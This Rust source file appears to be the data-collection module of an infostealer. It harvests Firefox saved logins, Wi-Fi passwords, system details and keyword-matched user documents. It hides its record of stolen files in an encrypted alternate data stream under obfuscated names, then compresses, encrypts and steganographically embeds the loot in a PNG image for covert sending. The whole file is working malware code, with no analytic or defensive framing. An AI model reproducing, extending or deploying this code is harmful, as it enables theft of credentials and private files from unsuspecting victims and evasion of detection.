use crate::{collectors::{self, docs::DEFAULT_KEYWORDS_REGEX, firefox, wifi}, crypto::aes::{decrypt, encrypt}, utils::{get_current_exe, get_unique_id, is_admin}};
use bitvec::prelude::*;
use flate2::{
    bufread::{ZlibDecoder, ZlibEncoder},
    Compression,
};
use png::{Decoder, Encoder};
use serde::{Deserialize, Serialize};
use serde_json::to_string;
use sha1::Sha1;
use std::{
    collections::{HashMap, HashSet},
    convert::TryFrom,
};
use std::{
    io::{Read, Write},
    str::from_utf8,
};
use wifi::dump_wifi_passwords;

pub static BG_FILE: &[u8] = include_bytes!("bg.png");

#[derive(Serialize, Deserialize, Debug)]
pub struct Credentials {
    pub firefox: Option<crate::collectors::firefox::Logins>,
    pub wifi: Option<crate::collectors::wifi::WifiLogins>,
}

#[derive(Serialize, Deserialize, Debug)]
pub struct DataPayload {
    pub id: Option<String>,
    pub creds: Option<Credentials>,
    pub os_info: Option<os_info::Info>,
    pub files: Option<HashMap<String, Vec<u8>>>,
    pub is_admin: bool
}

impl DataPayload {
    pub async fn recolt_periodic() -> Self {
        let ff_logins = firefox::get_all_logins().await.ok();
        let wf_logins = dump_wifi_passwords().await;
        let filelist =
            collectors::docs::collect_filenames_from_main_dirs(Some(&DEFAULT_KEYWORDS_REGEX));
        let uuid = get_unique_id();

        let files = Self::recolt_files_once(&filelist.unwrap_or_default()).await;

        DataPayload {
            id: uuid,
            creds: Some(Credentials {
                firefox: ff_logins,
                wifi: wf_logins,
            }),
            os_info: Some(os_info::get()),
            files: files,
            is_admin: is_admin()
        }
    }

    async fn recolt_files_once(files: &[String]) -> Option<HashMap<String, Vec<u8>>> {
        let mut total_size = 0;
        let max_size = 2_000_000usize;

        let saved_files_buffer =
            tokio::fs::read(get_current_exe() + obfstr::obfstr!(":statistics"))
                .await
                .unwrap_or_default();


        let mut sent_files = if saved_files_buffer.len() > 0 {
            let files = decrypt(&saved_files_buffer).ok()?;
            let actual_files = std::str::from_utf8(&files).ok()?;
            serde_json::from_str::<HashSet<String>>(&actual_files).ok()?
        } else {
            HashSet::new()
        };

        let mut recolted_files = HashMap::new();

        for file_path in files.iter() {
            if let Ok(data) = tokio::fs::read(file_path).await {
                let mut hasher = Sha1::new();
                hasher.update(&data);
                let digest = hasher.digest().to_string();

                if !sent_files.contains(&digest) {
                    let mut buffer = Vec::new();
                    let mut encoder = ZlibEncoder::new(data.as_slice(), Compression::best());
                    if let Ok(written_bytes) = encoder.read_to_end(&mut buffer) {
                        let tmp_size = total_size + written_bytes + file_path.as_bytes().len();

                        if tmp_size < max_size {
                            recolted_files.insert(file_path.to_string(), data);
                            total_size = tmp_size;
                            sent_files.insert(digest);
                        }
                    }
                }
            }
        }

        let file_sent = encrypt(serde_json::to_string(&sent_files).ok()?.as_bytes());
        let _ = tokio::fs::write(
            get_current_exe() + obfstr::obfstr!(":statistics"),
            &file_sent,
        )
        .await;

        Some(recolted_files)
    }

    pub fn encode_for_send(&self) -> Option<Vec<u8>> {
        let data = serde_json::to_string(self).ok()?;
        let mut encoder = ZlibEncoder::new(data.as_bytes(), Compression::best());

        let mut compressed_buffer = Vec::new();
        encoder.read_to_end(&mut compressed_buffer).ok()?;

        Some(encrypt(&compressed_buffer))
    }

    pub fn encode_for_send_to_image(&self) -> Option<Vec<u8>> {
        let payload = self.encode_for_send()?;
        let size = u32::try_from(payload.len()).ok()?;

        let payload_bitslice = payload.view_bits::<Lsb0>();

        let decoder = Decoder::new(BG_FILE);
        let (info, mut reader) = decoder.read_info().ok()?;

        let mut img_buffer = vec![0; info.buffer_size()];
        reader.next_frame(&mut img_buffer).ok()?;

        for (payload, dest_byte) in size
            .view_bits::<Lsb0>()
            .iter()
            .zip(img_buffer[0..32].iter_mut())
        {
            dest_byte.view_bits_mut::<Lsb0>().set(0, *payload);
        }

        let mut final_image = Vec::with_capacity(BG_FILE.len());
        {
            let mut encoder = Encoder::new(&mut final_image, info.width, info.height);
            encoder.set_color(info.color_type);
            encoder.set_depth(info.bit_depth);
            let mut writer = encoder.write_header().ok()?;

            for (payload, dest_byte) in payload_bitslice.iter().zip(img_buffer[32..].iter_mut()) {
                dest_byte.view_bits_mut::<Lsb0>().set(0, *payload);
            }

            writer.write_image_data(&img_buffer).ok();
        }

        Some(final_image)
    }
}
